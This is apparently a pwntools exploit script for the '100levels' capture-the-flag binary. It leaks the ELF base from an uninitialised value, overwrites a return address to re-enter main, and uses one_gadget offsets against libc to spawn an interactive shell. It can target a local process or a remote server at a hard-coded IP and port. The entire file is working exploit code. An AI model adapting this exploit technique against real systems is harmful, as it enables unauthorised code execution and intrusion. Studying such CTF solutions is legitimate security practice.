#no aslr
from pwn import *
from LibcSearcher import *

debug =1
if debug:
    context.log_level = 'debug'
    io = process('./100levels')
else:
    io = remote("111.198.29.45",44322)
libc = ELF('./libc.so')
elf = ELF('./100levels')
s       = lambda data               :io.send(str(data)) 
sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
sl      = lambda data               :io.sendline(str(data))
sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)

one_gadgets_ti = [0x4526a,0xef6c4,0xf0567]
one_gadgets=[0x45216,0x4526a,0xf02a4,0xf1147]
one_gadget=one_gadgets_ti[0]

def hint():
    sla('Choice:','2')

def go(first,more):
    ru("Choice:\n")
    sl('1')    
    ru("How many levels?\n")
    sl(str(first))
    ru("Any more?\n")
    sl(str(more))

go(2,0)
ru('Answer:')
s(('0\n').ljust(0x30, '\x00') + '\x00')
ru("Question: ")
c = int(ru(' * '))
z = int(ru(' = '))
elf.address = u64(p32(z) + p32(c)) & 0xfffffffff000#leak elf base
print hex(elf.address)
ru('Answer:')
c=''
c=c.ljust(0x8*5)
c+=p64(elf.address+0xf47)#main
sl(c)

hint()
go(0,one_gadget - libc.symbols['system'])
for i in range(99):
    ru("Question: ")
    a=int(ru('*')[:-1])
    b=int(ru('=')[:-1])
    ru('Answer:')
    sl(str(a*b))
ru('Answer:')
c=''
c=c.ljust(0x8*7)
c+=p64(elf.address+0x1030)#gadget
s(c)

io.interactive()